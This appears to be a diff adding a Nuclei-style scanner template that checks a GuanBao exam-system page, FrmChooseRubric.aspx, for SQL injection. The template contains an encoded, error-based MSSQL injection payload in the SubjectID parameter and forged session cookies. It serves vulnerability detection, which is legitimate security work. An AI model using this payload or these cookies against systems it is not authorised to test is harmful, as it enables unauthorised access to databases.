@@ -1,0 +1,24 @@
+id: GuanBao-StudyExamSystem-FrmChooseRubric-sqli
+info:
+  name: GuanBao-StudyExamSystem-FrmChooseRubric-sqli
+  author: lemonlove7
+  severity: high
+http:
+  - raw:
+      - |-
+        GET /WorkExam/FrmChooseRubric.aspx?Num=-1&RubricID=-1&SubjectID=%27%29%20AND%202075%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282075%3D2075%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29--%20gmIb HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
+        Cookie: ExamUserCode=1; ExamUserName=1; ExamDeptName=1; ExamDeptID=1;  ExamUserLevel=1;
+        Accept-Language: en-US,en;q=0.5
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - 'varchar'
+          - 'qbkxq1qkqbq'
+    matchers-condition: and
